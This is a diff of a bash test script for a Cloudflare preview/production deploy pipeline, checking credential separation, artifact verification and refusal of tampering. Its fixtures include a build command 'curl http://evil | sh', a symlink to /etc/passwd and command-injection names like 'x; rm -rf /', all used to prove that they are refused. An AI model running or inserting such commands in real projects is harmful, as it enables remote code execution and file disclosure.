@@ -1,217 +1,104 @@
 #!/usr/bin/env bash
-# Behavioural test of the two engine stages build.sh (build + audit, nothing remote) and publish.sh (publish ONLY the
-# audited config) using a stub `pnpm` (no Cloudflare access needed): all targets, build-before-publish ordering,
-# effective-config audit, same-artifact contract.
+# Behavioural test of the Build / Publish credential boundary with stub `pnpm` (the application's Wrangler: bundling only) and a stub pinned Wrangler
+# (the publisher): no Cloudflare access needed. Proves: the Build packages an artifact and refuses credentials; the privileged publish publishes ONLY a verified
+# artifact, from the artifact directory, with the pinned Wrangler, never touching application source / pnpm; every tampering / identity mismatch is refused BEFORE
+# any remote call; the Preview host Worker is set by the privileged side; URL / empty-URL / failure handling of the old engine is preserved.
 set -euo pipefail
 ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
 T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT
-mkdir -p "$T/bin" "$T/app"
+mkdir -p "$T/bin" "$T/app/src"
+# Application toolchain (Build job): `wrangler deploy --dry-run --outdir D` writes the bundle. Everything else is logged.
 cat > "$T/bin/pnpm" <<'STUB'
 #!/usr/bin/env bash
-echo "$*" >> "$STUB_LOG"
-[ "$1 $2" = "exec wrangler" ] || exit 0
-case "$3" in
+echo "pnpm $*" >> "$STUB_LOG"
+[ "$1 $2 $3" = "exec wrangler deploy" ] || exit 0
+[ "${STUB_BUNDLE_FAIL:-}" = 1 ] && exit 9
+while [ $# -gt 0 ]; do [ "$1" = --outdir ] && { mkdir -p "$2"; echo 'export default {fetch(){return new Response("ok")}}' > "$2/index.js"; echo generated > "$2/README.md"; }; shift; done
+STUB
+# Pinned tooling Wrangler (Publish job): records cwd + args + whether any application file is visible.
+cat > "$T/bin/wr" <<'STUB'
+#!/usr/bin/env bash
+echo "wr cwd=$(basename "$PWD") $*" >> "$STUB_LOG"
+case "$1" in
+  --version) echo 4.135.0;;
   preview) [ "${STUB_FAIL:-}" = 1 ] && exit 9
            if [ -n "${STUB_PREVIEW_RAW+x}" ]; then printf '%s' "$STUB_PREVIEW_RAW"; else echo '{"preview":{"urls":["https://stable.example.workers.dev"]}}'; fi;;
   deployments) echo '[{"created_on":"2024-01-01","versions":[{"version_id":"prev-1","percentage":100}]}]';;
-  versions) if [ "$4" = upload ]; then echo "Worker Version ID: new-2"; fi;;
+  versions) if [ "$2" = upload ]; then echo "Worker Version ID: new-2"; fi;;
 esac
 STUB
-chmod +x "$T/bin/pnpm"
-export PATH="$T/bin:$PATH" STUB_LOG="$T/log" TOOLS_DIR="$ROOT/actions/cf-preview" APP_DIR="$T/app" OUT_FILE="$T/out.json" GITHUB_SHA=abcdef1234567890 STATE_DIR="$T/state"
+chmod +x "$T/bin/pnpm" "$T/bin/wr"
+export PATH="$T/bin:$PATH" STUB_LOG="$T/log" TOOLS_DIR="$ROOT/actions/cf-preview" APP_DIR="$T/app" OUT_FILE="$T/out.json" WRANGLER="$T/bin/wr"
 fail=0; ok(){ echo "PASS: $1"; }; bad(){ echo "FAIL: $1"; fail=1; }
-printf 'name = "x"\n[previews]\n' > "$T/app/wrangler.toml"
-B="$ROOT/actions/cf-preview/build.sh"; P="$ROOT/actions/cf-preview/publish.sh"
-# D = the delivery sequence the engine runs: build + audit first, then publish ONLY what was audited. Stdout is publish.sh's.
-export B P
-D() { rm -rf "$STATE_DIR"; "$B" >/dev/null || return $?; "$P"; }
-
-# ---- nested app_path: TOOLS_DIR given RELATIVE to the workspace root (as the workflow does), stages cd into the app ----
-RELTOOLS="$(realpath --relative-to="$ROOT" "$ROOT/actions/cf-preview")"
-(cd "$ROOT" && TOOLS_DIR="$RELTOOLS" TARGET=preview PREVIEW_NAME=feat-a BUILD_CMD=true D 2>/dev/null) | grep -qx 'url=https://stable.example.workers.dev' && ok "relative TOOLS_DIR works with a nested app dir" || bad "relative TOOLS_DIR works with a nested app dir"
-
-# ---- preview ----
-TARGET=preview PREVIEW_NAME=feat-a BUILD_CMD=true D 2>/dev/null | grep -qx 'url=https://stable.example.workers.dev' && ok "preview: extracts stable URL" || bad "preview: extracts stable URL"
-grep -Eq 'preview --name feat-a --config [^ ]+wrangler.toml --json' "$T/log" && ok "preview: uses wrangler preview --name --config <audited config> --json" || bad "preview: wrangler args"
-
-: > "$T/log"
-TARGET=preview PREVIEW_NAME=feat-a BUILD_CMD=false D >/dev/null 2>&1 && bad "preview: build failure must fail" || ok "preview: build failure fails"
-grep -q 'preview' "$T/log" && bad "preview ran after failed build" || ok "preview: failed build never touches the existing Preview"
-
-TARGET=preview PREVIEW_NAME=feat-a BUILD_CMD=true STUB_FAIL=1 D >/dev/null 2>&1 && bad "wrangler failure must fail" || ok "preview: wrangler failure fails"
-TARGET=preview PREVIEW_NAME='feat/a;rm -rf' BUILD_CMD=true D >/dev/null 2>&1 && bad "unsafe name accepted" || ok "preview: unsafe name rejected"
-TARGET=preview BUILD_CMD=true D >/dev/null 2>&1 && bad "missing PREVIEW_NAME accepted" || ok "preview: PREVIEW_NAME required"
-
-: > "$T/log"
-TARGET=preview PREVIEW_NAME=feat-a BUILD_CMD=true WORKER_NAME=blog-preview D >/dev/null 2>&1
-grep -Eq 'preview --name feat-a --worker-name blog-preview --config [^ ]+ --json' "$T/log" && ok "preview: passes --worker-name when set" || bad "worker-name passthrough"
-: > "$T/log"
-TARGET=preview PREVIEW_NAME=feat-a BUILD_CMD=true D >/dev/null 2>&1
-grep -q -- '--worker-name' "$T/log" && bad "worker-name leaked when unset" || ok "preview: no --worker-name when unset"
-TARGET=preview PREVIEW_NAME=feat-a BUILD_CMD=true WORKER_NAME='x; rm -rf /' D >/dev/null 2>&1 && bad "unsafe worker name accepted" || ok "preview: unsafe worker name rejected"
-
-# Effective (adapter-generated) config is audited: it adds an unapproved service binding the source lacks.
-: > "$T/log"
-BAD_BUILD='mkdir -p .wrangler/deploy dist && echo "{\"configPath\":\"../../dist/wrangler.json\"}" > .wrangler/deploy/config.json && echo "{\"name\":\"x\",\"services\":[{\"binding\":\"S\",\"service\":\"prod\"}],\"previews\":{}}" > dist/wrangler.json'
-TARGET=preview PREVIEW_NAME=feat-a BUILD_CMD="$BAD_BUILD" D >/dev/null 2>&1 && bad "bad effective Preview config accepted" || ok "preview: effective config with unapproved binding is rejected"
-grep -q 'preview --name' "$T/log" && bad "published despite bad effective config" || ok "preview: nothing published when effective audit fails"
-rm -rf "$T/app/.wrangler" "$T/app/dist"
-GOOD_BUILD='mkdir -p .wrangler/deploy dist && echo "{\"configPath\":\"../../dist/wrangler.json\"}" > .wrangler/deploy/config.json && echo "{\"name\":\"x\",\"previews\":{}}" > dist/wrangler.json'
-TARGET=preview PREVIEW_NAME=feat-a BUILD_CMD="$GOOD_BUILD" D >/dev/null 2>&1 && ok "preview: clean effective config accepted" || bad "clean effective config rejected"
-rm -rf "$T/app/.wrangler" "$T/app/dist"
-
-# ---- the empty-URL incident (blog run 39708495349): `wrangler preview --json` without a usable URL ----
-# Root cause: `echo "url=$(node cli.mjs extract-url | sed ...)"` made the extractor's failure invisible (the
-# pipeline status is sed's, echo's is 0) and published `url=` as a successful output, so Smoke ran with no URL.
-incident() { # <label> <raw wrangler stdout>
-  : > "$T/log"
-  local out rc=0
-  out="$(TARGET=preview PREVIEW_NAME=feat-a BUILD_CMD=true STUB_PREVIEW_RAW="$2" D 2>"$T/err")" || rc=$?
-  [ "$rc" != 0 ] && ok "$1: publish fails" || bad "$1: publish must fail (rc=$rc)"
-  echo "$out" | grep -q '^url=' && bad "$1: reported a url= line" || ok "$1: no url= line is emitted (nothing for Smoke to run against)"
-  echo "$out" | grep -qx 'preview_mutated=true' && ok "$1: reports that the Preview may have been modified" || bad "$1: preview_mutated missing"
-}
-incident "empty preview.urls" '{"preview":{"urls":[]}}'
-grep -q 'EMPTY `preview.urls`' "$T/err" && grep -q 'Preview URLs' "$T/err" && ok "empty preview.urls: actionable error explains how to enable Preview URLs" || bad "empty urls diagnostic"
-incident "missing urls property" '{"preview":{}}'
-incident "missing preview object" '{"other":1}'
-incident "malformed JSON" 'this is not json'
-incident "empty wrangler output" ''
-incident "non-string URL" '{"preview":{"urls":[null]}}'
-incident "empty-string URL" '{"preview":{"urls":[""]}}'
-incident "http URL" '{"preview":{"urls":["http://x.example.com"]}}'
-incident "relative URL" '{"preview":{"urls":["/just/a/path"]}}'
-grep -q 'AKIA\|secret' "$T/err" && bad "diagnostics leaked payload content" || ok "diagnostics do not echo the Wrangler payload"
-# a child parser that exits nonzero without printing anything must fail the parent
-mkdir -p "$T/badtools"; ln -sf "$ROOT/actions/cf-preview/envfile.sh" "$T/badtools/envfile.sh"
-printf "import { spawnSync } from 'node:child_process';\nif (process.argv[2] === 'extract-url') process.exit(3);\nprocess.exit(spawnSync('node', ['%s/actions/cf-preview/cli.mjs', ...process.argv.slice(2)], { stdio: 'inherit' }).status);\n" "$ROOT" > "$T/badtools/cli.mjs"
-ln -sf "$ROOT/actions/cf-preview/parse-env.mjs" "$T/badtools/parse-env.mjs"
-: > "$T/log"
-OUT="$(TOOLS_DIR="$T/badtools" TARGET=preview PREVIEW_NAME=feat-a BUILD_CMD=true D 2>/dev/null)" && bad "silent failing parser accepted" || ok "child extractor exiting nonzero makes publish.sh fail"
-echo "$OUT" | grep -q '^url=' && bad "url= emitted after a failed parser" || ok "no empty/guessed URL after a failed parser"
-# valid output still yields exactly one clean url
-OUT="$(TARGET=preview PREVIEW_NAME=feat-a BUILD_CMD=true D 2>/dev/null)"
-[ "$(echo "$OUT" | grep -c '^url=')" = 1 ] && echo "$OUT" | grep -qx 'url=https://stable.example.workers.dev' && ok "valid payload: exactly one https url= line" || bad "valid url output"
-
-# ---- Preview host readiness (read-only Cloudflare API stub on localhost) ----
-cat > "$T/api.mjs" <<'JS'
-import http from 'node:http';
-const mode = process.env.API_MODE;
-const s = http.createServer((req, res) => {
-  if (mode === 'down') { res.statusCode = 500; return res.end('{}'); }
-  res.setHeader('content-type', 'application/json');
-  res.end(JSON.stringify({ success: true, result: { enabled: false, previews_enabled: mode === 'enabled' } }));
-}).listen(0, '127.0.0.1', () => console.log(s.address().port));
-JS
-host_case() { # <mode> -> sets API port, runs deploy, echoes rc
-  API_MODE="$1" node "$T/api.mjs" > "$T/port" & local pid=$!
-  for _ in 1 2 3 4 5 6 7 8 9 10; do [ -s "$T/port" ] && break; sleep 0.3; done
-  rm -f "$T/built"; : > "$T/log"
-  local rc=0
-  CF_API_BASE="http://127.0.0.1:$(cat "$T/port")" CLOUDFLARE_API_TOKEN=t CLOUDFLARE_ACCOUNT_ID=a HOST_WORKER=blog \
-    TARGET=preview PREVIEW_NAME=feat-a BUILD_CMD="touch $T/built" D >/dev/null 2>"$T/err" || rc=$?
-  kill $pid 2>/dev/null; wait $pid 2>/dev/null || true; : > "$T/port"
-  return $rc
-}
-host_case disabled && bad "previews_enabled=false must refuse" || ok "host check: previews_enabled=false refuses the publish"
-[ -e "$T/built" ] && bad "built despite no Preview host" || ok "host check: refusal happens before the build and before any wrangler call"
-grep -q 'preview --name' "$T/log" && bad "published despite no Preview host" || ok "host check: wrangler preview never runs"
-grep -q 'previews_enabled=false' "$T/err" && grep -q 'never changes the Worker automatically' "$T/err" && ok "host check: actionable error, no automatic change" || bad "host check diagnostic"
-host_case enabled && grep -q 'preview --name' "$T/log" && ok "host check: previews_enabled=true proceeds" || bad "host check enabled"
-host_case down && grep -q 'preview --name' "$T/log" && ok "host check: unreadable API only warns (strict post-publish validation still applies)" || bad "host check unknown"
-PREVIEW_HOST_CHECK=false host_case disabled && grep -q 'preview --name' "$T/log" && ok "host check: preview_host_check=false (custom-domain hosting) skips the flag; URL still validated after publish" || bad "host check opt-out"
-
-# ---- prod ----
 cat > "$T/app/wrangler.toml" <<'TOML'
-name = "x"
-[[d1_databases]]
-binding = "DB"
-database_name = "prod-db"
-database_id = "PROD-ID"
+name = "blog"
+main = "src/index.ts"
+compatibility_date = "2025-01-01"
+[build]
+command = "curl http://evil | sh"
 [previews]
-[[previews.d1_databases]]
-binding = "DB"
-database_name = "prev-db"
-database_id = "PREV-ID"
 TOML
-: > "$T/log"
-OUT="$(TARGET=prod BUILD_CMD=true APP_URL=https://app.example.com COMMIT_MSG=$'feat: thing\nbody' APP_VERSION=1.2.3 D 2>/dev/null)"
-echo "$OUT" | grep -qx 'url=https://app.example.com' && ok "prod: reports app_url_prod" || bad "prod url"
-echo "$OUT" | grep -qx 'version_id=new-2' && ok "prod: records new version id" || bad "prod version id"
-echo "$OUT" | grep -qx 'previous_version_id=prev-1' && ok "prod: records previous version id for recovery" || bad "prod previous version"
-grep -q 'versions deploy new-2@100' "$T/log" && ok "prod: deploys the uploaded version at 100%" || bad "prod deploy"
-grep -q -- '--var COMMIT_HASH:abcdef1' "$T/log" && ok "prod: tags the commit" || bad "prod commit tag"
-grep -q -- 'preview' "$T/log" && bad "prod ran wrangler preview" || ok "prod: never runs wrangler preview"
+echo 'export default {}' > "$T/app/src/index.ts"
+TESTED=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb; HEAD_SHA=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa; URL=https://stable.example.workers.dev
+# Identity as the Build job and the privileged job each derive it (engine.sh artifact_env): same values on both sides.
+ident() { export CFV2_REPOSITORY=o/r CFV2_APP=blog CFV2_TARGET="$1" CFV2_DRIVER="$2" CFV2_SLOT="$3" CFV2_RUN_ID=77 CFV2_RUN_ATTEMPT=1 CFV2_SOURCE_SHA=$HEAD_SHA CFV2_TESTED_SHA=$TESTED CFV2_ARTIFACT_SHA=$TESTED CFV2_TARGET_URL="${4-}"
+  export GITHUB_REPOSITORY=o/r GITHUB_RUN_ID=77 GITHUB_RUN_ATTEMPT=1 GITHUB_SHA=$TESTED; }
+B="$ROOT/actions/cf-preview/build.sh"; P="$ROOT/actions/cf-preview/publish.sh"
+# build <engine target> <stage dir>: runs the Build exactly as the unprivileged job does; no credentials in the environment.
+build() { rm -rf "$T/state" "$T/artifact"; : > "$STUB_LOG"; STATE_DIR="$T/state" ARTIFACT_DIR="$T/artifact" TARGET="$1" PREVIEW_NAME=pr-4 TARGET_URL="${CFV2_TARGET_URL-}" BUILD_CMD=true "$B" >/dev/null 2>"$T/build.err" || { [ -n "${DEBUG_TEST:-}" ] && cat "$T/build.err" >&2; return 1; }; }
+# publish <engine target>: the privileged side: verify (audit config pointers like artifact-verify) then publish. Stdout is publish.sh's.
+pub() { mkdir -p "$T/state"; printf '%s' "$T/artifact/wrangler.json" > "$T/state/config.path"; printf source > "$T/state/config.mode"; sha256sum "$T/artifact/wrangler.json" | cut -d' ' -f1 > "$T/state/config.sha"
+  : > "$STUB_LOG"; STATE_DIR="$T/state" ARTIFACT_DIR="$T/artifact" TARGET="$1" WORKER_NAME="${WORKER_NAME-blog}" PREVIEW_NAME="${PREVIEW_NAME-pr-4}" EXPECTED_URL="${EXPECTED_URL-}" "$P" 2>"$T/pub.err"; }
 
-: > "$T/log"
-TARGET=prod BUILD_CMD=false D >/dev/null 2>&1 && bad "prod build failure must fail" || ok "prod: build failure fails"
-grep -q 'versions' "$T/log" && bad "prod published after failed build" || ok "prod: failed build never touches Production"
+# ---- Build: artifact, no credentials, no remote ------------------------------------------------------------------------------------------------
+ident preview native-preview native-branch "$URL"
+build preview && [ -f "$T/artifact/manifest.json" ] && [ -f "$T/artifact/worker/index.js" ] && ok "build: packages an artifact (manifest, bundle)" || bad "build: packages an artifact"
+node -e 'const c=require(process.argv[1]);process.exit(c.no_bundle===true&&c.main==="worker/index.js"&&!("build" in c)?0:1)' "$T/artifact/wrangler.json" && ok "build: the build command is dropped, main -> bundle, no_bundle" || bad "build: packaged config is publish-ready"
+grep -q "^pnpm exec wrangler deploy --dry-run" "$STUB_LOG" && ! grep -q "^wr " "$STUB_LOG" && ok "build: bundles offline with the application's Wrangler; the pinned publisher is never called" || bad "build: only dry-run bundling"
+(CLOUDFLARE_API_TOKEN=x build preview) && bad "build: refuses a Cloudflare token" || ok "build: refuses a Cloudflare token"
+(CLOUDFLARE_ACCOUNT_ID=x build preview) && bad "build: refuses an account id" || ok "build: refuses an account id"
+(STUB_BUNDLE_FAIL=1 build preview) && bad "build: a failed bundle fails the build" || ok "build: a failed bundle fails the build"
 
-BAD_PROD='mkdir -p .wrangler/deploy dist && echo "{\"configPath\":\"../../dist/wrangler.json\"}" > .wrangler/deploy/config.json && echo "{\"name\":\"x\",\"d1_databases\":[{\"binding\":\"DB\",\"database_name\":\"prev-db\",\"database_id\":\"PREV-ID\"}]}" > dist/wrangler.json'
-: > "$T/log"
-TARGET=prod BUILD_CMD="$BAD_PROD" D >/dev/null 2>&1 && bad "prod bound Preview D1 accepted" || ok "prod: effective config binding a Preview resource is rejected"
-grep -q 'versions' "$T/log" && bad "prod published despite audit failure" || ok "prod: nothing published when effective audit fails"
+# ---- Publish (privileged): verified artifact only ---------------------------------------------------------------------------------------------
+ident preview native-preview native-branch "$URL"; build preview
+OUT="$(EXPECTED_URL=$URL pub preview)" && [ "$OUT" = "$(printf 'preview_mutated=true\nurl=%s' "$URL")" ] && ok "preview: publishes the artifact and reports the URL" || { bad "preview: publishes the artifact"; echo "$OUT"; cat "$T/pub.err"; }
+grep -q "^wr cwd=artifact preview --name pr-4 --worker-name blog --config $T/artifact/wrangler.json --json" "$STUB_LOG" && ok "preview: pinned Wrangler runs IN the artifact dir with the privileged side's name and host Worker" || { bad "preview: wrangler args"; cat "$STUB_LOG"; }
+! grep -q "^pnpm" "$STUB_LOG" && ok "publish: never invokes the application's package manager" || bad "publish: invoked pnpm"
+EXPECTED_URL=$URL WORKER_NAME='' pub preview >/dev/null 2>&1 && bad "preview: host Worker is mandatory (never taken from the artifact)" || ok "preview: host Worker is mandatory (never taken from the artifact)"
+EXPECTED_URL=https://other.example.workers.dev pub preview >/dev/null 2>&1 && bad "preview: published URL must equal the URL the artifact was built for" || ok "preview: published URL must equal the URL the artifact was built for"
+(STUB_FAIL=1 pub preview >/dev/null 2>&1) && bad "preview: wrangler failure fails" || ok "preview: wrangler failure fails"
+(STUB_PREVIEW_RAW='{"preview":{}}' pub preview >/dev/null 2>&1) && bad "preview: no URL in the response fails (empty-URL incident)" || ok "preview: no URL in the response fails (empty-URL incident)"
+(PREVIEW_NAME='Bad Name' pub preview >/dev/null 2>&1) && bad "preview: unsafe name rejected" || ok "preview: unsafe name rejected"
 
-# A Preview that deliberately shares a Production R2 bucket (approved by an exact preview_binding_allow entry).
-cp "$T/app/wrangler.toml" "$T/app/wrangler.toml.bak"
-cat >> "$T/app/wrangler.toml" <<'TOML'
-[[r2_buckets]]
-binding = "CACHE"
-bucket_name = "shared-bucket"
-[[previews.r2_buckets]]
-binding = "CACHE"
-bucket_name = "shared-bucket"
-TOML
-SHARED_PROD='mkdir -p .wrangler/deploy dist && echo "{\"configPath\":\"../../dist/wrangler.json\"}" > .wrangler/deploy/config.json && echo "{\"name\":\"x\",\"d1_databases\":[{\"binding\":\"DB\",\"database_name\":\"prod-db\",\"database_id\":\"PROD-ID\"}],\"r2_buckets\":[{\"binding\":\"CACHE\",\"bucket_name\":\"shared-bucket\"}]}" > dist/wrangler.json'
-: > "$T/log"
-TARGET=prod BUILD_CMD="$SHARED_PROD" D >/dev/null 2>&1 && bad "prod: unapproved shared Preview R2 accepted" || ok "prod: a Preview-shared R2 bucket without an allow entry is rejected"
-: > "$T/log"
-TARGET=prod BUILD_CMD="$SHARED_PROD" PREVIEW_ALLOW='r2_buckets:CACHE=shared-bucket' D >/dev/null 2>&1 && ok "prod: an exact preview_binding_allow entry approves the shared R2 bucket" || bad "prod: approved shared R2 bucket rejected"
-grep -q 'versions deploy' "$T/log" && ok "prod: approved shared R2 bucket is published" || bad "prod: approved shared R2 bucket not published"
-mv "$T/app/wrangler.toml.bak" "$T/app/wrangler.toml"
-TARGET=other BUILD_CMD=true D >/dev/null 2>&1 && bad "bad TARGET accepted" || ok "unknown TARGET rejected"
+# ---- every refusal happens BEFORE any remote call ------------------------------------------------------------------------------------------
+refuse() { # <label> <mutation command...>
+  local l="$1"; shift; ident preview native-preview native-branch "$URL"; build preview; "$@"
+  if EXPECTED_URL=$URL pub preview >/dev/null 2>&1; then bad "refused: $l"; elif grep -q "^wr " "$STUB_LOG"; then bad "refused before any remote call: $l"; else ok "refused before any remote call: $l"; fi
+}
+refuse "modified bundle" bash -c "echo evil > $T/artifact/worker/index.js"
+refuse "added file" bash -c "echo x > $T/artifact/worker/extra.js"
+refuse "symlink in assets" bash -c "mkdir -p $T/artifact/assets/0 && ln -s /etc/passwd $T/artifact/assets/0/p"
+refuse "missing manifest" rm -f "$T/artifact/manifest.json"
+refuse "config forged to run a build (digest recomputed)" bash -c "node -e '
+const fs=require(\"fs\"),c=require(\"crypto\"),d=process.argv[1];const p=d+\"/wrangler.json\";const j=JSON.parse(fs.readFileSync(p));j.build={command:\"x\"};fs.writeFileSync(p,JSON.stringify(j));
+const m=JSON.parse(fs.readFileSync(d+\"/manifest.json\"));const h=c.createHash(\"sha256\");
+const files=[\"wrangler.json\",\"worker/index.js\"].sort();for(const f of files)h.update(f+\"\\0\"+c.createHash(\"sha256\").update(fs.readFileSync(d+\"/\"+f)).digest(\"hex\")+\"\\n\");
+m.files_digest=h.digest(\"hex\");fs.writeFileSync(d+\"/manifest.json\",JSON.stringify(m))' $T/artifact"
+ident preview native-preview native-branch "$URL"; build preview
+(CFV2_TESTED_SHA=cccccccccccccccccccccccccccccccccccccccc EXPECTED_URL=$URL pub preview >/dev/null 2>&1) && bad "refused: artifact of another revision" || ok "refused: artifact of another revision (stale / unrelated build)"
+(GITHUB_RUN_ID=78 EXPECTED_URL=$URL pub preview >/dev/null 2>&1) && bad "refused: artifact of another run" || ok "refused: artifact of another run"
+(CFV2_TARGET=dev CFV2_DRIVER=worker CFV2_SLOT=persistent-dev EXPECTED_URL=$URL pub preview >/dev/null 2>&1) && bad "refused: artifact built for another target" || ok "refused: artifact built for another target"
 
-# ---- the same-artifact contract: publish.sh publishes ONLY what build.sh audited ----
-rm -rf "$STATE_DIR" "$T/app/.wrangler" "$T/app/dist"; : > "$T/log"
-TARGET=prod "$P" >/dev/null 2>&1 && bad "publish without a build/audit accepted" || ok "publish.sh refuses to run when nothing was built and audited"
-grep -q 'versions' "$T/log" && bad "published without audit" || ok "publish.sh: no Wrangler call without an audited config"
-TARGET=prod BUILD_CMD=true "$B" >/dev/null 2>&1; echo '# tampered' >> "$T/app/wrangler.toml"
-: > "$T/log"; TARGET=prod "$P" >/dev/null 2>&1 && bad "config changed after audit accepted" || ok "publish.sh refuses a config that changed between audit and publish"
-grep -q 'versions' "$T/log" && bad "published a changed config" || ok "publish.sh: a changed config is never published"
-sed -i '/# tampered/d' "$T/app/wrangler.toml"
-# the effective (adapter-generated) config is what gets published, explicitly (--config), with no named env applied on top
-EFF='mkdir -p .wrangler/deploy dist && echo "{\"configPath\":\"../../dist/wrangler.json\"}" > .wrangler/deploy/config.json && echo "{\"name\":\"x\",\"previews\":{}}" > dist/wrangler.json'
-: > "$T/log"; TARGET=prod BUILD_CMD="$EFF" CLOUDFLARE_ENV=dev D >/dev/null 2>&1
-grep -Eq 'versions upload --config [^ ]*dist/wrangler.json' "$T/log" && ok "prod: publishes the audited effective config explicitly (--config), not the source" || bad "effective config not passed explicitly"
-grep -q -- '--env' "$T/log" && bad "named env applied on top of the effective config" || ok "an ambient CLOUDFLARE_ENV is neutralised: the audited config is published as is"
-rm -rf "$T/app/.wrangler" "$T/app/dist"
-# ROLLBACK_TO re-publishes a previous version with the SAME audited config
-: > "$T/log"; TARGET=prod BUILD_CMD=true D >/dev/null 2>&1; : > "$T/log"
-TARGET=prod ROLLBACK_TO=prev-1 "$P" >/dev/null 2>&1 && grep -Eq 'versions deploy prev-1@100 --config [^ ]+wrangler.toml' "$T/log" && ok "prod rollback uses the audited config" || bad "rollback config"
-TARGET=prod ROLLBACK_TO='x;rm -rf /' "$P" >/dev/null 2>&1 && bad "unsafe rollback id accepted" || ok "unsafe rollback version id rejected"
-TARGET=preview PREVIEW_NAME=feat-a ROLLBACK_TO=prev-1 "$P" >/dev/null 2>&1 && bad "ROLLBACK_TO accepted for preview" || ok "ROLLBACK_TO is Production only"
+# ---- production: versions upload -> versions deploy, previous version recorded --------------------------------------------------------------
+ident production worker production "https://app.example.com"; build prod
+OUT="$(APP_URL=https://app.example.com pub prod)" && printf '%s' "$OUT" | grep -qx 'version_id=new-2' && printf '%s' "$OUT" | grep -qx 'previous_version_id=prev-1' && ok "prod: uploads then deploys the artifact; records the previous version" || { bad "prod publish"; echo "$OUT"; cat "$T/pub.err"; }
+n_up=$(grep -n "versions upload" "$STUB_LOG" | head -1 | cut -d: -f1); n_dp=$(grep -n "versions deploy new-2@100" "$STUB_LOG" | head -1 | cut -d: -f1)
+[ -n "$n_up" ] && [ -n "$n_dp" ] && [ "$n_up" -lt "$n_dp" ] && ok "prod: upload happens before deploy" || bad "prod: upload before deploy"
+grep -q "versions upload --config $T/artifact/wrangler.json" "$STUB_LOG" && ok "prod: only the artifact config is published" || bad "prod: artifact config"
 
-# ---- Shared Dev (target=dev): identity audit in build.sh; the engine is the only publisher ----
-cat > "$T/app/wrangler.toml" <<'TOML'
-name = "x"
-[[queues.producers]]
-binding = "Q"
-queue = "prod-queue"
-[env.dev]
-name = "x-dev"
-[[env.dev.queues.producers]]
-binding = "Q"
-queue = "dev-queue"
-TOML
-DEVV=(TARGET=dev DEV_ENV=dev DEV_WORKER=x-dev APP_URL=https://dev.example.com)
-: > "$T/log"; env "${DEVV[@]}" BUILD_CMD=true bash -c "$(declare -f D); D" >/dev/null 2>&1 && grep -Eq 'deploy --config [^ ]+wrangler.toml --env dev' "$T/log" && ok "dev: default publish is wrangler deploy --config <audited> --env dev" || bad "dev default publish"
-: > "$T/log"; env "${DEVV[@]}" DEV_WORKER=other BUILD_CMD=true bash -c "$(declare -f D); D" >/dev/null 2>&1 && bad "wrong Worker identity accepted" || ok "dev: a config for another Worker identity is rejected before publish"
-grep -q 'deploy' "$T/log" && bad "published wrong identity" || ok "dev: nothing published after a failed audit"
-sed -i 's/queue = "dev-queue"/queue = "prod-queue"/' "$T/app/wrangler.toml"
-: > "$T/log"; env "${DEVV[@]}" BUILD_CMD=true bash -c "$(declare -f D); D" >/dev/null 2>&1 && bad "Production queue in Dev accepted" || ok "dev: a Production Queue binding fails the audit"
-grep -q 'deploy' "$T/log" && bad "published with a Production queue" || ok "dev: nothing published with a Production Queue binding"
-python3 - "$T/app/wrangler.toml" <<'PY'
-import sys; p = sys.argv[1]; s = open(p).read(); i = s.index("[env.dev]"); open(p, "w").write(s[:i] + s[i:].replace("prod-queue", "dev-queue"))
-PY
-: > "$T/log"; env "${DEVV[@]}" BUILD_CMD=true PUBLISH_CMD='echo "evil custom publish" >> "$STUB_LOG"' bash -c "$(declare -f D); D" >/dev/null 2>&1 && ! grep -q "evil custom publish" "$T/log" && grep -Eq "deploy --config [^ ]+wrangler.toml --env dev" "$T/log" && ok "dev: the engine is the only publisher (a PUBLISH_CMD in the environment is never executed)" || bad "dev: engine-only publish"
-exit $fail
+# ---- dev worker: named environment is selected explicitly for a SOURCE config -------------------------------------------------------------------
+printf 'name = "blog"\nmain = "src/index.ts"\ncompatibility_date = "2025-01-01"\n[env.dev]\nname = "blog-dev"\n' > "$T/app/wrangler.toml"
+ident dev worker persistent-dev "https://dev.example.com"; DEV_WORKER=blog-dev DEV_ENV=dev build dev
+APP_URL=https://dev.example.com DEV_ENV=dev pub dev >/dev/null 2>&1 && grep -q "deploy --config $T/artifact/wrangler.json --env dev" "$STUB_LOG" && ok "dev: deploys the artifact with the audited named env" || { bad "dev publish"; cat "$STUB_LOG"; }
+
+[ "$fail" = 0 ] && echo "ALL PASSED" || { echo "FAILURES"; exit 1; }
